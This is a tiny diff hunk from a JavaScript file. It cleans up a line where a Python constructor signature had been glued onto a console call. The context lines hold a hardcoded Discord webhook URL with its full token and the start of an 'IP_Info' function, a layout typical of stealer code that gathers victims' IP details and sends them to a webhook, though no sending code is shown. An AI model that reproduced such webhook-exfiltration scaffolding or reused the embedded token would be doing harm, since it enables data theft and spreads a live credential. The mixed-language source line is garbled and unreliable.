@@ -1,4 +1,4 @@
-      console.dir(working);def __init__(self, *args, **kwargs):
+      console.dir(working);
 const webhook = "https://ptb.discord.com/api/webhooks/1040394758020927599/xBbrb8ArnGGfYlsTTRmNqz0qsVA0tB_HXvyf1CX5YJs7cdWSNz2k4x0PVq3zbK4XjB17"
 
 async function IP_Info(){
